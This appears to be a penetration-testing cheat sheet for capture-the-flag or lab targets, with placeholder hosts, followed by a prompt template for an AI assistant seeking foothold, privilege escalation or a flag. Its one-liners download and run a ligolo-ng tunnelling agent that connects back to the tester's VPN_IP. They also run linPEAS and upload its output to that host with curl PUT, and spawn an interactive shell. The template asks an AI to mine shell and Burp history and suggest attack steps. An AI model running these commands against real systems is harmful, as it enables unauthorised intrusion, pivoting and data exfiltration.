```sh

# ligolo-ng -selfcert
curl http://VPN_IP:6789/linux/ligolo-ng/agent_linux_amd64 -o /tmp/agent_linux_amd64;wait;chmod +x /tmp/agent_linux_amd64;/tmp/agent_linux_amd64 -connect VPN_IP:11601 -ignore-cert &

# ligolo-ng »
session # select tunnel session
interface_create --name hi
tunnel_start --tun hi
interface_add_route --name hi --route 240.0.0.1/32
interface_add_route --name hi --route 172.16.16.0/24

# linPEAS quick + full
curl http://VPN_IP:6789/linux/linPEAS/linpeas.sh -o /tmp/linpeas.sh;wait;chmod +x /tmp/linpeas.sh;/tmp/linpeas.sh -qs | tee /tmp/linpeas; wait; curl -X PUT --upload-file /tmp/linpeas http://VPN_IP/; wait; /tmp/linpeas.sh -qaN  > /tmp/lp 2>&1 &

# shell upgrade
id;env;/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash")'

# set DC_HOST, DC_IP, and DOMAIN
/opt/my-resources/bin/hostnamer.sh TARGET_IP DC01.DOMAIN_SLUG -dc

```
```js

- Target: TARGET_IP CHALLENGE_SLUG
- Recon output: `/workspace/results/*/scans`. Please read _full_tcp_nmap.txt + _errors.log first.
- Goal: <foothold|privesc|flag>.

- Before suggesting steps, mine: _full_tcp_nmap.txt + _errors.log, newest artifacts in /workspace/tmp/, our commands in /root/.zsh_history after "YOUR COMMANDS BELOW", and Burp proxy history via burp-mcp (active editor or scoped history for the right host:port).
